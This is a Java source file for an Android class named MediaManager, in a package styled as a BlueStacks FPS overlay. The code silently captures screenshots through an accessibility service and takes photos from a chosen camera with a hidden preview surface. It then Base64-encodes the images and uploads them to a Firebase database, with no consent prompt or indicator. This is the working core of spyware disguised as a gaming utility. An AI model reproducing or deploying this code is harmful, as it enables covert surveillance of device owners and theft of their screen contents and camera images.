package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Base64;
import android.view.Display;
import com.google.firebase.database.DatabaseReference;
import androidx.annotation.NonNull;
import java.io.ByteArrayOutputStream;

public class MediaManager {
    private final Context context;
    private final DatabaseReference dataRef;

    public MediaManager(Context context, DatabaseReference dataRef) {
        this.context = context;
        this.dataRef = dataRef;
    }

    public void takeScreenshotAction(AccessibilityService service) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            service.takeScreenshot(Display.DEFAULT_DISPLAY, context.getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull AccessibilityService.ScreenshotResult result) {
                    Bitmap bm = null;
                    HardwareBuffer hb = null;
                    try {
                        hb = result.getHardwareBuffer();
                        bm = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
                        if (bm != null) {
                            Bitmap swBm = bm.copy(Bitmap.Config.ARGB_8888, false);
                            Bitmap scaled = Bitmap.createScaledBitmap(swBm, swBm.getWidth(), swBm.getHeight(), true);
                            dataRef.child("camera").removeValue();
                            sendImage("screenshot", scaled, 50);
                            swBm.recycle();
                            scaled.recycle();
                        }
                    } catch (Exception ignored) {
                    } finally {
                        if (bm != null) bm.recycle();
                        if (hb != null) hb.close();
                    }
                }

                @Override
                public void onFailure(int e) {
                }
            });
        }
    }

    public void takeCameraAction(int camId) {
        new Thread(() -> {
            Camera cam = null;
            try {
                cam = Camera.open(camId);
                SurfaceTexture st = new SurfaceTexture(10);
                cam.setPreviewTexture(st);
                Camera.Parameters p = cam.getParameters();
                p.setRotation(camId == 1 ? 270 : 90);
                cam.setParameters(p);
                cam.startPreview();
                Thread.sleep(400);
                cam.takePicture(null, null, (data, camera) -> {
                    Bitmap bm = BitmapFactory.decodeByteArray(data, 0, data.length);
                    if (bm != null) {
                        dataRef.child("screenshot").removeValue();
                        sendImage("camera", bm, 60);
                        bm.recycle();
                    }
                    camera.release();
                });
            } catch (Exception e) {
                if (cam != null) cam.release();
            }
        }).start();
    }

    public void sendImage(String type, Bitmap bm, int quality) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, quality, out);
        dataRef.child(type).setValue(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP));
    }
}
